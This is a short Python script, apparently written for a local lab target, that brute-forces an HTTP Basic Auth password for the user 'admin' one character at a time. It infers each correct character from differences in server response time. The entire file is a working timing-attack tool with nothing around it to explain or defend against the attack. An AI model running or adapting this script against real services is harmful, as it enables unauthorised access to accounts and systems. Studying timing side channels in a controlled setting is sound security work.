import requests
from requests.auth import HTTPBasicAuth

# specify a character set
char_set = "abcdefghijklmnopqrstuvwxyz0123456789"
passwd = ""
# specify target url
url = "http://127.0.0.1/basic_auth"
# specify the initial timelapse of failed guess
timelapseF = 1.4
response = requests.get(url)
while response.status_code == 401:
    for char in char_set:
        response = requests.get(url, auth=HTTPBasicAuth('admin', passwd + char))
        timelapse = response.elapsed.total_seconds()
        timelapseDiff = timelapse - timelapseF
        print("[+] Response time from " + char + " was " + str(timelapse))
        if timelapseDiff >= 0.15 or timelapseDiff <= -0.15:
            print("Bruteforced " + char)
            passwd += char
            print(passwd)
            timelapseF = timelapse
            break
        else:
            timelapseF = timelapse
            continue